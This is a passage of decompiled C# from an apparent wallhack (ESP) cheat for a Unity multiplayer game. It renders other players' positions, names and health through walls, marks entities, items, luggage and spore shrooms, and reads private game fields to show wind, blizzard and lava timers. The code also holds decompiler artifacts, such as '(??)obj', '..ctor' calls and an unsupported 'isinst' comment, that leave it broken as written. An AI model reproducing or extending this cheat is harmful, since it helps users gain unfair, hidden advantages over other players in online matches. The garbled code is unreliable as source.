						}
						if (!flag)
						{
							if (val.player != null)
							{
								flag2 = true;
							}
							else if ((Object)(object)val.gameObject.GetComponent<Player>() != (Object)null)
							{
								flag2 = true;
							}
							else
							{
								flag = true;
							}
						}
					}
					catch
					{
						if (val.player == null)
						{
							flag = true;
						}
						else
						{
							flag2 = true;
						}
					}
					_checkedGameObjects.Add(val.gameObject);
					if (!flag2 && flag && !_cachedEntities.Contains(val.gameObject))
					{
						_cachedEntities.Add(val.gameObject);
						num++;
					}
				}
				try
				{
					Type type = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "Beetle");
					if (type != null)
					{
						Object[] array3 = Object.FindObjectsByType(type, FindObjectsSortMode.None);
						foreach (Object val2 in array3)
						{
							if (!(val2 == (Object)null))
							{
								GameObject val3 = (GameObject)(object)((val2 is GameObject) ? val2 : null);
								if (!(val3 == null) && !_cachedEntities.Contains(val3) && !_cachedEntities.Contains(val3))
								{
									_cachedEntities.Add(val3);
									num++;
								}
							}
						}
					}
					Type type2 = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "Mob" && t.IsClass);
					if (type2 != null)
					{
						Object[] array3 = Object.FindObjectsByType(type2, FindObjectsSortMode.None);
						foreach (Object val4 in array3)
						{
							if (!(val4 == (Object)null))
							{
								GameObject val5 = (GameObject)(object)((val4 is GameObject) ? val4 : null);
								if (!(val5 == null) && !_cachedEntities.Contains(val5) && !((Object)(object)val5.GetComponent<Character>() != (Object)null))
								{
									_cachedEntities.Add(val5);
									num++;
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Debug.Log((object)("[ESP] Error finding additional entities: " + ex.Message));
				}
				if (num > 0)
				{
					Debug.Log((object)$"[ESP] Updated entity cache: {num} entities found (all non-player entities)");
				}
			}
			catch (Exception ex2)
			{
				Debug.LogError((object)("[ESP] Error updating entity cache: " + ex2.Message + "\n" + ex2.StackTrace));
			}
		}

		private static void UpdateEnvironmentalCache(Vector3 cameraPos)
		{
			_cachedEnvironmentalEvents.Clear();
		}

		private static void UpdateObjectCache()
		{
			_cachedObjects.Clear();
		}

		private static void RenderPlayersGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			float time = Time.time;
			if (_cachedTargets.Count == 0 || time - _targetsCacheTime > 2f)
			{
				if (CheatConfig.Targets != null && CheatConfig.Targets.Count > 0)
				{
					_cachedTargets = new List<Character>(CheatConfig.Targets);
				}
				else
				{
					_cachedTargets.Clear();
					if (Character.AllCharacters != null)
					{
						foreach (Character allCharacter in Character.AllCharacters)
						{
							if (!(allCharacter == null) && !((Object)(object)allCharacter == (Object)(object)Character.localCharacter) && !((Object)(object)allCharacter.photonView == (Object)null) && !allCharacter.photonView.IsMine)
							{
								bool flag = allCharacter.player != null;
								if (!flag)
								{
									GameObject gameObject = allCharacter.gameObject;
									flag = (Object)(object)((gameObject != null) ? gameObject.GetComponent<Player>() : null) != (Object)null;
								}
								if (flag)
								{
									_cachedTargets.Add(allCharacter);
								}
							}
						}
					}
				}
				_targetsCacheTime = time;
			}
			List<Character> cachedTargets = _cachedTargets;
			int num = 0;
			int num2 = 0;
			foreach (Character item in cachedTargets)
			{
				if (item == null || (Object)(object)item == (Object)(object)Character.localCharacter || (Object)(object)item.transform == (Object)null || (item.data != null && item.data.dead))
				{
					continue;
				}
				float num3 = Vector3.Distance(localPlayerPos, item.Center);
				if (num3 > 50f)
				{
					continue;
				}
				Color distanceColor = GetDistanceColor(num3, PlayerColor);
				if (CheatConfig.PlayerBoxESP && num < 3)
				{
					Bounds characterBounds = GetCharacterBounds(item);
					if (CheatConfig.PlayerBox3D)
					{
						Draw3DBox(characterBounds, distanceColor, 2f);
					}
					else
					{
						DrawSimple2DBox(characterBounds, distanceColor, 2f);
					}
					num++;
				}
				if (CheatConfig.PlayerSkeletonESP && num2 < 2)
				{
					DrawSkeleton(item, distanceColor);
					num2++;
				}
			}
		}

		private static void RenderPlayersText(Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			float time = Time.time;
			if (_cachedTargets.Count == 0 || time - _targetsCacheTime > 2f)
			{
				if (CheatConfig.Targets != null && CheatConfig.Targets.Count > 0)
				{
					_cachedTargets = new List<Character>(CheatConfig.Targets);
				}
				else
				{
					_cachedTargets.Clear();
					if (Character.AllCharacters != null)
					{
						foreach (Character allCharacter in Character.AllCharacters)
						{
							if (!(allCharacter == null) && !((Object)(object)allCharacter == (Object)(object)Character.localCharacter) && !((Object)(object)allCharacter.photonView == (Object)null) && !allCharacter.photonView.IsMine)
							{
								bool flag = allCharacter.player != null;
								if (!flag)
								{
									GameObject gameObject = allCharacter.gameObject;
									flag = (Object)(object)((gameObject != null) ? gameObject.GetComponent<Player>() : null) != (Object)null;
								}
								if (flag)
								{
									_cachedTargets.Add(allCharacter);
								}
							}
						}
					}
				}
				_targetsCacheTime = time;
			}
			foreach (Character cachedTarget in _cachedTargets)
			{
				if (cachedTarget == null || (Object)(object)cachedTarget == (Object)(object)Character.localCharacter || (Object)(object)cachedTarget.transform == (Object)null || (cachedTarget.data != null && cachedTarget.data.dead))
				{
					continue;
				}
				float num = Vector3.Distance(localPlayerPos, cachedTarget.Center);
				if (num > 50f)
				{
					continue;
				}
				CharacterRefs refs = cachedTarget.refs;
				Vector3? obj;
				if (refs == null)
				{
					obj = null;
				}
				else
				{
					Bodypart head = refs.head;
					obj = ((head != null) ? new Vector3?(head.transform.position) : null);
				}
				Vector3 val = (Vector3)(((??)obj) ?? (cachedTarget.Center + Vector3.up * 0.5f));
				Vector3 val2 = Camera.main.WorldToScreenPoint(val);
				if (val2.z <= 0f)
				{
					continue;
				}
				List<string> list = new List<string>();
				Color distanceColor = GetDistanceColor(num, PlayerColor);
				if (CheatConfig.PlayerNameESP)
				{
					Player player = cachedTarget.player;
					object obj2;
					if (player == null)
					{
						obj2 = null;
					}
					else
					{
						PhotonView photonView = player.photonView;
						if (photonView == null)
						{
							obj2 = null;
						}
						else
						{
							Player owner = photonView.Owner;
							obj2 = ((owner != null) ? owner.NickName : null);
						}
					}
					if (obj2 == null)
					{
						obj2 = "Unknown";
					}
					string text = (string)obj2;
					if (text.Length > 64)
					{
						text = text.Substring(0, 61) + "...";
					}
					list.Add(text);
				}
				if (CheatConfig.PlayerDistanceESP)
				{
					list.Add($"{num:F1}m");
				}
				if (CheatConfig.PlayerHealthESP)
				{
					float characterHealth = GetCharacterHealth(cachedTarget);
					list.Add($"HP: {characterHealth:F0}%");
				}
				float num2 = 0f;
				foreach (string item in list)
				{
					DrawTextWithOutline(new Vector2(val2.x, (float)Screen.height - val2.y + num2), item, distanceColor, 14, num);
					num2 += 16f;
				}
			}
		}

		private static void RenderEntitiesGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			if (Camera.main == null || (!CheatConfig.EntityBoxESP && !CheatConfig.EntitySkeletonESP))
			{
				return;
			}
			float time = Time.time;
			if (_cachedEntities.Count == 0 || time - _entityCacheTime > 20f)
			{
				UpdateEntityCache(cameraPos);
				_entityCacheTime = time;
			}
			if (_cachedEntities.Count == 0)
			{
				return;
			}
			GameObject currentlyControlledEntity = CheatConfig.CurrentlyControlledEntity;
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			foreach (GameObject cachedEntity in _cachedEntities)
			{
				if (cachedEntity == null || (currentlyControlledEntity != null && (Object)(object)cachedEntity == (Object)(object)currentlyControlledEntity))
				{
					continue;
				}
				Character component = cachedEntity.GetComponent<Character>();
				if (Vector3.Distance(localPlayerPos, cachedEntity.transform.position) > 50f)
				{
					continue;
				}
				bool flag = false;
				try
				{
					int selectedEntityIndex = CheatConfig.SelectedEntityIndex;
					if (selectedEntityIndex >= 0)
					{
						List<GameObject> allEntitiesInGame = GUI.GetAllEntitiesInGame();
						if (allEntitiesInGame != null && selectedEntityIndex < allEntitiesInGame.Count && (Object)(object)allEntitiesInGame[selectedEntityIndex] == (Object)(object)cachedEntity)
						{
							flag = true;
						}
					}
				}
				catch
				{
				}
				if (!flag && num3 >= 3)
				{
					continue;
				}
				Color color = GetEntityColor(GetEntityType(cachedEntity));
				if (flag)
				{
					color = Color.yellow;
				}
				if (CheatConfig.EntityBoxESP && (flag || num < 3))
				{
					float lineWidth = (flag ? 3f : 2f);
					Bounds bounds = ((!(component != null)) ? GetObjectBounds(cachedEntity) : GetCharacterBounds(component));
					if (CheatConfig.EntityBox3D)
					{
						Draw3DBox(bounds, color, lineWidth);
					}
					else
					{
						DrawSimple2DBox(bounds, color, lineWidth);
					}
					if (!flag)
					{
						num++;
					}
				}
				if (CheatConfig.EntitySkeletonESP && component != null && (flag || num2 < 2))
				{
					DrawSkeleton(component, color);
					if (!flag)
					{
						num2++;
					}
				}
				if (!flag)
				{
					num3++;
				}
			}
		}

		private static void RenderEntitiesText(Vector3 localPlayerPos)
		{
			if (Camera.main == null || (!CheatConfig.EntityNameESP && !CheatConfig.EntityAIStateESP) || _cachedEntities.Count == 0)
			{
				return;
			}
			foreach (GameObject cachedEntity in _cachedEntities)
			{
				if (cachedEntity == null)
				{
					continue;
				}
				Character component = cachedEntity.GetComponent<Character>();
				float num = Vector3.Distance(localPlayerPos, cachedEntity.transform.position);
				Vector3 val = ((!(component != null)) ? (cachedEntity.transform.position + Vector3.up * 1.5f) : GetEntityHeadPosition(cachedEntity, component));
				Vector3 val2 = Camera.main.WorldToScreenPoint(val);
				if (val2.z <= 0f)
				{
					continue;
				}
				string entityType = GetEntityType(cachedEntity);
				Color entityColor = GetEntityColor(entityType);
				List<string> list = new List<string>();
				if (CheatConfig.EntityNameESP)
				{
					list.Add(entityType);
				}
				if (CheatConfig.EntityDistanceESP)
				{
					list.Add($"{num:F1}m");
				}
				if (CheatConfig.EntityAIStateESP)
				{
					string entityAIState = GetEntityAIState(cachedEntity, component);
					if (!string.IsNullOrEmpty(entityAIState))
					{
						list.Add("AI: " + entityAIState);
					}
				}
				float num2 = 0f;
				foreach (string item in list)
				{
					DrawTextWithOutline(new Vector2(val2.x, (float)Screen.height - val2.y + num2), item, entityColor, 13, num);
					num2 += 15f;
				}
			}
		}

		private static void RenderItemsGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			int num = 0;
			foreach (Item cachedItem in _cachedItems)
			{
				if (cachedItem == null || (Object)(object)cachedItem.gameObject == (Object)null || IsItemHeld(cachedItem))
				{
					continue;
				}
				Vector3 position = cachedItem.transform.position;
				float num2 = Vector3.Distance(localPlayerPos, position);
				if (!(num2 > CheatConfig.ItemESPMaxDistance) && !(Camera.main.WorldToScreenPoint(position).z <= 0f))
				{
					if (num >= 8)
					{
						break;
					}
					Bounds itemBounds = GetItemBounds(cachedItem);
					Color itemColor = GetItemColor(GetItemName(cachedItem));
					itemColor = GetDistanceColor(num2, itemColor);
					if (CheatConfig.ItemBoxESP)
					{
						Draw3DBox(itemBounds, itemColor, 1.5f);
						num++;
					}
				}
			}
		}

		private static bool IsItemHeld(Item item)
		{
			if (item == null)
			{
				return false;
			}
			try
			{
				FieldInfo field = typeof(Item).GetField("_holderCharacter", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null && (Object)/*isinst with value type is only supported in some contexts*/ != (Object)null)
				{
					return true;
				}
			}
			catch
			{
			}
			try
			{
				PropertyInfo property = typeof(Item).GetProperty("itemState");
				if (property != null)
				{
					object value = property.GetValue(item);
					if (value != null && value.ToString() == "Held")
					{
						return true;
					}
				}
			}
			catch
			{
			}
			return false;
		}

		private static void RenderItemsChams(Vector3 cameraPos)
		{
			if (Camera.main == null || _chamsMaterial == null)
			{
				return;
			}
			Vector3 localPlayerPosition = GetLocalPlayerPosition(cameraPos);
			foreach (Item cachedItem in _cachedItems)
			{
				if (cachedItem == null || (Object)(object)cachedItem.gameObject == (Object)null || IsItemHeld(cachedItem))
				{
					continue;
				}
				Vector3 position = cachedItem.transform.position;
				if (!(Camera.main.WorldToScreenPoint(position).z <= 0f))
				{
					float distance = Vector3.Distance(localPlayerPosition, position);
					Color val = GetItemColor(GetItemName(cachedItem));
					val = GetDistanceColor(distance, val);
					val.a = 0.6f;
					if (val.r > 0.7f && val.g > 0.7f && val.b < 0.4f)
					{
						((Color)(ref val))..ctor(val.r, val.g * 0.6f, val.b * 0.3f);
					}
					RenderChamsForItem(cachedItem.gameObject, val);
				}
			}
		}

		private static void RenderChamsForItem(GameObject obj, Color color)
		{
			if (obj == null || _chamsMaterial == null || Camera.main == null)
			{
				return;
			}
			MeshRenderer[] componentsInChildren = obj.GetComponentsInChildren<MeshRenderer>(true);
			MeshFilter[] componentsInChildren2 = obj.GetComponentsInChildren<MeshFilter>(true);
			Dictionary<Transform, MeshFilter> dictionary = new Dictionary<Transform, MeshFilter>();
			MeshFilter[] array = componentsInChildren2;
			foreach (MeshFilter val in array)
			{
				if (val != null && (Object)(object)val.transform != (Object)null)
				{
					dictionary[val.transform] = val;
				}
			}
			Material val2 = new Material(_chamsMaterial);
			val2.color = color;
			MeshRenderer[] array2 = componentsInChildren;
			foreach (MeshRenderer val3 in array2)
			{
				if (val3 == null)
				{
					continue;
				}
				Transform transform = val3.transform;
				if (!dictionary.ContainsKey(transform))
				{
					continue;
				}
				MeshFilter val4 = dictionary[transform];
				if (val4 == null)
				{
					continue;
				}
				Mesh sharedMesh = val4.sharedMesh;
				if (!(sharedMesh == null))
				{
					Matrix4x4 localToWorldMatrix = transform.localToWorldMatrix;
					for (int j = 0; j < sharedMesh.subMeshCount; j++)
					{
						Graphics.DrawMesh(sharedMesh, localToWorldMatrix, val2, 0, Camera.main, j, (MaterialPropertyBlock)null, (ShadowCastingMode)0, false);
					}
				}
			}
			if (val2 != null)
			{
				Object.DestroyImmediate((Object)(object)val2);
			}
		}

		private static void RenderItemsText(Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			foreach (Item cachedItem in _cachedItems)
			{
				if (cachedItem == null || (Object)(object)cachedItem.gameObject == (Object)null || IsItemHeld(cachedItem))
				{
					continue;
				}
				Vector3 position = cachedItem.transform.position;
				float num = Vector3.Distance(localPlayerPos, position);
				if (num > CheatConfig.ItemESPMaxDistance)
				{
					continue;
				}
				Vector3 val = Camera.main.WorldToScreenPoint(position);
				if (val.z <= 0f)
				{
					continue;
				}
				string itemName = GetItemName(cachedItem);
				Color itemColor = GetItemColor(itemName);
				itemColor = GetDistanceColor(num, itemColor);
				List<string> list = new List<string>();
				if (CheatConfig.ItemNameESP)
				{
					list.Add(itemName);
				}
				if (CheatConfig.ItemDistanceESP)
				{
					list.Add($"{num:F1}m");
				}
				float num2 = -18f;
				foreach (string item in list)
				{
					DrawTextWithOutline(new Vector2(val.x, (float)Screen.height - val.y + num2), item, itemColor, 12, num);
					num2 += 14f;
				}
			}
		}

		private static void RenderLuggageGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			foreach (GameObject item in _cachedLuggage)
			{
				if (!(item == null))
				{
					Vector3 position = item.transform.position;
					float num = Vector3.Distance(localPlayerPos, position);
					if (!(num > CheatConfig.LuggageESPMaxDistance) && !(Camera.main.WorldToScreenPoint(position).z <= 0f))
					{
						Bounds luggageBounds = GetLuggageBounds(item);
						Color distanceColor = GetDistanceColor(num, LuggageColor);
						Draw3DBox(luggageBounds, distanceColor, 2f);
					}
				}
			}
		}

		private static Bounds GetLuggageBounds(GameObject luggage)
		{
			Bounds result;
			if (luggage == null)
			{
				result = default(Bounds);
				return result;
			}
			Bounds result2 = default(Bounds);
			((Bounds)(ref result2))..ctor(luggage.transform.position, Vector3.zero);
			bool flag = false;
			Renderer[] componentsInChildren = luggage.GetComponentsInChildren<Renderer>(true);
			foreach (Renderer val in componentsInChildren)
			{
				if (!(val != null))
				{
					continue;
				}
				result = val.bounds;
				Vector3 size = ((Bounds)(ref result)).size;
				if ((size).magnitude > 0.01f)
				{
					if (!flag)
					{
						result2 = val.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val.bounds);
					}
				}
			}
			Collider[] componentsInChildren2 = luggage.GetComponentsInChildren<Collider>(true);
			foreach (Collider val2 in componentsInChildren2)
			{
				if (val2 != null)
				{
					if (!flag)
					{
						result2 = val2.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val2.bounds);
					}
				}
			}
			if (!flag)
			{
				MeshFilter[] componentsInChildren3 = luggage.GetComponentsInChildren<MeshFilter>(true);
				Bounds val6 = default(Bounds);
				foreach (MeshFilter val3 in componentsInChildren3)
				{
					if (val3 != null && val3.sharedMesh != null)
					{
						Bounds bounds = val3.sharedMesh.bounds;
						Vector3 val4 = val3.transform.TransformPoint(((Bounds)(ref bounds)).center);
						Vector3 val5 = val3.transform.TransformVector(((Bounds)(ref bounds)).size);
						((Bounds)(ref val6))..ctor(val4, val5);
						if (!flag)
						{
							result2 = val6;
							flag = true;
						}
						else
						{
							((Bounds)(ref result2)).Encapsulate(val6);
						}
					}
				}
			}
			if (!flag)
			{
				((Bounds)(ref result2))..ctor(luggage.transform.position, Vector3.one * 1.5f);
			}
			return result2;
		}

		private static void RenderLuggageText(Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			foreach (GameObject item in _cachedLuggage)
			{
				if (item == null)
				{
					continue;
				}
				Vector3 position = item.transform.position;
				float num = Vector3.Distance(localPlayerPos, position);
				if (num > CheatConfig.LuggageESPMaxDistance)
				{
					continue;
				}
				Vector3 val = Camera.main.WorldToScreenPoint(position);
				if (val.z <= 0f)
				{
					continue;
				}
				string luggageName = GetLuggageName(item);
				List<string> list = new List<string>();
				if (CheatConfig.LuggageNameESP)
				{
					list.Add(luggageName);
				}
				if (CheatConfig.LuggageDistanceESP)
				{
					list.Add($"{num:F1}m");
				}
				float num2 = -18f;
				foreach (string item2 in list)
				{
					DrawTextWithOutline(new Vector2(val.x, (float)Screen.height - val.y + num2), item2, LuggageColor, 11, num);
					num2 += 15f;
				}
			}
		}

		private static void UpdateSporeShroomCache(Vector3 cameraPos)
		{
			_cachedSporeShrooms.RemoveAll((GameObject shroom) => shroom == null);
			try
			{
				PhotonView[] array;
				MonoBehaviour[] array2;
				if (!_initialCacheComplete)
				{
					array = Object.FindObjectsByType<PhotonView>(FindObjectsSortMode.None);
					foreach (PhotonView val in array)
					{
						if (!(val == null) && !((Object)(object)val.gameObject == (Object)null))
						{
							GameObject gameObject = val.gameObject;
							if (IsSporeShroom(gameObject))
							{
								_checkedGameObjects.Add(gameObject);
								_cachedSporeShrooms.Add(gameObject);
							}
						}
					}
					array2 = Object.FindObjectsByType<MonoBehaviour>(FindObjectsSortMode.None);
					foreach (MonoBehaviour val2 in array2)
					{
						if (!(val2 == null) && !((Object)(object)val2.gameObject == (Object)null))
						{
							GameObject gameObject2 = val2.gameObject;
							if (!_checkedGameObjects.Contains(gameObject2) && ((object)val2).GetType().Name == "TriggerEvent" && IsSporeShroom(gameObject2))
							{
								_checkedGameObjects.Add(gameObject2);
								_cachedSporeShrooms.Add(gameObject2);
							}
						}
					}
					return;
				}
				array = Object.FindObjectsByType<PhotonView>(FindObjectsSortMode.None);
				foreach (PhotonView val3 in array)
				{
					if (val3 == null || (Object)(object)val3.gameObject == (Object)null)
					{
						continue;
					}
					GameObject gameObject3 = val3.gameObject;
					if (!_checkedGameObjects.Contains(gameObject3))
					{
						_checkedGameObjects.Add(gameObject3);
						if (IsSporeShroom(gameObject3))
						{
							_cachedSporeShrooms.Add(gameObject3);
						}
					}
				}
				array2 = Object.FindObjectsByType<MonoBehaviour>(FindObjectsSortMode.None);
				foreach (MonoBehaviour val4 in array2)
				{
					if (val4 == null || (Object)(object)val4.gameObject == (Object)null)
					{
						continue;
					}
					GameObject gameObject4 = val4.gameObject;
					if (!_checkedGameObjects.Contains(gameObject4) && ((object)val4).GetType().Name == "TriggerEvent")
					{
						_checkedGameObjects.Add(gameObject4);
						if (IsSporeShroom(gameObject4))
						{
							_cachedSporeShrooms.Add(gameObject4);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.Log((object)("[ESP] Error updating spore shroom cache: " + ex.Message));
			}
		}

		private static bool IsSporeShroom(GameObject obj)
		{
			if (obj == null || obj.transform == null)
			{
				return false;
			}
			if ((Object)(object)obj.GetComponent<Item>() != (Object)null)
			{
				return false;
			}
			if ((Object)(object)obj.GetComponent<Character>() != (Object)null)
			{
				return false;
			}
			if (_luggageComponentType != null && (Object)(object)obj.GetComponent(_luggageComponentType) != (Object)null)
			{
				return false;
			}
			string text = (((Object)obj).name ?? "").ToLower();
			bool result = text.Contains("sporeshroom") || text.Contains("sporefungus") || text.Contains("spore_shroom") || text.Contains("spore_fungus") || (text.Contains("spore") && text.Contains("shroom")) || (text.Contains("spore") && text.Contains("fungus"));
			bool flag = false;
			bool flag2 = false;
			MonoBehaviour[] components = obj.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (!(val == null))
				{
					string name = ((object)val).GetType().Name;
					if (name == "TriggerEvent")
					{
						flag = true;
					}
					if (name == "SpawnGameObject")
					{
						flag2 = true;
					}
				}
			}
			if (flag && flag2)
			{
				result = true;
			}
			return result;
		}

		private static void RenderSporeShroomsGL(Vector3 cameraPos, Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			float time = Time.time;
			if (_cachedSporeShrooms.Count == 0 || time - _sporeShroomCacheTime > 20f)
			{
				UpdateSporeShroomCache(cameraPos);
				_sporeShroomCacheTime = time;
			}
			Color distanceColor = default(Color);
			foreach (GameObject cachedSporeShroom in _cachedSporeShrooms)
			{
				if (!(cachedSporeShroom == null))
				{
					Vector3 position = cachedSporeShroom.transform.position;
					float num = Vector3.Distance(localPlayerPos, position);
					if (!(num > 200f) && !(Camera.main.WorldToScreenPoint(position).z <= 0f))
					{
						Bounds objectBounds = GetObjectBounds(cachedSporeShroom);
						((Color)(ref distanceColor))..ctor(0.8f, 0.2f, 1f, 1f);
						distanceColor = GetDistanceColor(num, distanceColor);
						Draw3DBox(objectBounds, distanceColor, 2f);
					}
				}
			}
		}

		private static void RenderSporeShroomsText(Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			Color distanceColor = default(Color);
			foreach (GameObject cachedSporeShroom in _cachedSporeShrooms)
			{
				if (cachedSporeShroom == null)
				{
					continue;
				}
				Vector3 position = cachedSporeShroom.transform.position;
				float num = Vector3.Distance(localPlayerPos, position);
				if (!(num > 200f))
				{
					Vector3 val = Camera.main.WorldToScreenPoint(position);
					if (!(val.z <= 0f))
					{
						string text = ((Object)cachedSporeShroom).name ?? "SporeShroom";
						text = text.Replace("(Clone)", "").Trim();
						((Color)(ref distanceColor))..ctor(0.8f, 0.2f, 1f, 1f);
						distanceColor = GetDistanceColor(num, distanceColor);
						DrawTextWithOutline(new Vector2(val.x, (float)Screen.height - val.y), text, distanceColor, 12, num);
					}
				}
			}
		}

		private static void RenderWeatherTimer()
		{
			InitializeStyles();
			float num = 30f;
			float time = Time.time;
			if (time - _windZoneCacheTime > 1f)
			{
				_cachedWindZone = WindChillZone.instance;
				if (_cachedWindZone == null)
				{
					_cachedWindZone = Object.FindFirstObjectByType<WindChillZone>();
				}
				_windZoneCacheTime = time;
				if (_untilSwitchField == null)
				{
					_untilSwitchField = typeof(WindChillZone).GetField("untilSwitch", BindingFlags.Instance | BindingFlags.NonPublic);
				}
				if (_windActiveField == null)
				{
					_windActiveField = typeof(WindChillZone).GetField("windActive", BindingFlags.Instance | BindingFlags.Public);
				}
			}
			if (_cachedWindZone != null && _untilSwitchField != null && _windActiveField != null)
			{
				try
				{
					float num2 = (float)_untilSwitchField.GetValue(_cachedWindZone);
					bool flag = (bool)_windActiveField.GetValue(_cachedWindZone);
					if (num2 > 0f)
					{
						string obj = (flag ? "Wind Active" : "Next Wind");
						string text = FormatTime(num2);
						string text2 = obj + ": " + text;
						Color textColor = (flag ? new Color(0.5f, 0.8f, 1f) : new Color(0.7f, 0.7f, 0.7f));
						DrawTextWithOutline(new Vector2(150f, num), text2, textColor, 14);
						num += 20f;
					}
				}
				catch
				{
				}
			}
			if (time - _stormVisualsCacheTime > 1f)
			{
				if (_stormVisualType == null)
				{
					_stormVisualType = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "StormVisual");
					if (_stormVisualType != null)
					{
						_stormTypeField = _stormVisualType.GetField("stormType", BindingFlags.Instance | BindingFlags.Public);
					}
				}
				if (_stormVisualType != null)
				{
					_cachedStormVisuals = Object.FindObjectsByType(_stormVisualType, FindObjectsSortMode.None);
				}
				_stormVisualsCacheTime = time;
			}
			if (_cachedStormVisuals != null && _stormVisualType != null && _stormTypeField != null)
			{
				try
				{
					Object[] cachedStormVisuals = _cachedStormVisuals;
					foreach (Object val in cachedStormVisuals)
					{
						if (val == (Object)null)
						{
							continue;
						}
						object value = _stormTypeField.GetValue(val);
						if (value == null)
						{
							continue;
						}
						string text3 = value.ToString();
						if (!text3.Contains("Snow") && !text3.Contains("Alpine"))
						{
							continue;
						}
						FieldInfo field = _stormVisualType.GetField("zone", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (!(field != null))
						{
							break;
						}
						object value2 = field.GetValue(val);
						WindChillZone val2 = (WindChillZone)((value2 is WindChillZone) ? value2 : null);
						if (val2 != null && _untilSwitchField != null && _windActiveField != null)
						{
							float num3 = (float)_untilSwitchField.GetValue(val2);
							bool flag2 = (bool)_windActiveField.GetValue(val2);
							if (num3 > 0f)
							{
								string obj3 = (flag2 ? "Alpine Blizzard Active" : "Next Alpine Blizzard");
								string text4 = FormatTime(num3);
								string text5 = obj3 + ": " + text4;
								Color textColor2 = (flag2 ? new Color(0.7f, 0.9f, 1f) : new Color(0.8f, 0.8f, 0.9f));
								DrawTextWithOutline(new Vector2(150f, num), text5, textColor2, 14);
								num += 20f;
							}
						}
						break;
					}
				}
				catch
				{
				}
			}
			if (time - _lavaRisingCacheTime > 1f)
			{
				if (_lavaRisingType == null)
				{
					_lavaRisingType = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "LavaRising");
					if (_lavaRisingType != null)
					{
						_timeTraveledProp = _lavaRisingType.GetProperty("timeTraveled", BindingFlags.Instance | BindingFlags.Public);
						_travelTimeProp = _lavaRisingType.GetProperty("travelTime", BindingFlags.Instance | BindingFlags.Public);
						_startedProp = _lavaRisingType.GetProperty("started", BindingFlags.Instance | BindingFlags.Public);
						_endedProp = _lavaRisingType.GetProperty("ended", BindingFlags.Instance | BindingFlags.Public);
						if (_timeTraveledProp == null)
						{
							_timeTraveledField = _lavaRisingType.GetField("timeTraveled", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						}
						if (_travelTimeProp == null)
						{
							_travelTimeField = _lavaRisingType.GetField("travelTime", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						}
						if (_startedProp == null)
						{
							_startedField = _lavaRisingType.GetField("started", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						}
						if (_endedProp == null)
						{
							_endedField = _lavaRisingType.GetField("ended", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						}
					}
				}
				if (_lavaRisingType != null)
				{
					try
					{
						PropertyInfo property = _lavaRisingType.GetProperty("Instance", BindingFlags.Static | BindingFlags.Public);
						if (property == null)
						{
							property = _lavaRisingType.GetProperty("instance", BindingFlags.Static | BindingFlags.Public);
						}
						if (property != null)
						{
							object value3 = property.GetValue(null);
							_cachedLavaRising = (Object)((value3 is Object) ? value3 : null);
						}
						else
						{
							_cachedLavaRising = Object.FindFirstObjectByType(_lavaRisingType);
						}
					}
					catch
					{
					}
				}
				_lavaRisingCacheTime = time;
			}
			if (!(_cachedLavaRising != (Object)null) || !(_lavaRisingType != null))
			{
				return;
			}
			try
			{
				bool flag3 = false;
				bool flag4 = false;
				float num4 = 0f;
				float num5 = 60f;
				if (_startedProp != null)
				{
					object value4 = _startedProp.GetValue(_cachedLavaRising);
					if (value4 is bool)
					{
						flag3 = (bool)value4;
					}
				}
				else if (_startedField != null)
				{
					object value5 = _startedField.GetValue(_cachedLavaRising);
					if (value5 is bool)
					{
						flag3 = (bool)value5;
					}
				}
				if (_endedProp != null)
				{
					object value6 = _endedProp.GetValue(_cachedLavaRising);
					if (value6 is bool)
					{
						flag4 = (bool)value6;
					}
				}
				else if (_endedField != null)
				{
					object value7 = _endedField.GetValue(_cachedLavaRising);
					if (value7 is bool)
					{
						flag4 = (bool)value7;
					}
				}
				if (_timeTraveledProp != null)
				{
					object value8 = _timeTraveledProp.GetValue(_cachedLavaRising);
					if (value8 is float)
					{
						num4 = (float)value8;
					}
				}
				else if (_timeTraveledField != null)
				{
					object value9 = _timeTraveledField.GetValue(_cachedLavaRising);
					if (value9 is float)
					{
						num4 = (float)value9;
					}
				}
				if (_travelTimeProp != null)
				{
					object value10 = _travelTimeProp.GetValue(_cachedLavaRising);
					if (value10 is float)
					{
						num5 = (float)value10;
					}
				}
				else if (_travelTimeField != null)
				{
					object value11 = _travelTimeField.GetValue(_cachedLavaRising);
					if (value11 is float)
					{
						num5 = (float)value11;
					}
				}
				if (flag3 && !flag4 && num5 > 0f)
				{
					float num6 = num5 - num4;
					if (num6 > 0f)
					{
						string text6 = FormatTime(num6);
						string text7 = "Lava Rising" + ": " + text6 + " remaining";
						Color textColor3 = default(Color);
						((Color)(ref textColor3))..ctor(1f, 0.4f, 0.2f);
						DrawTextWithOutline(new Vector2(150f, num), text7, textColor3, 14);
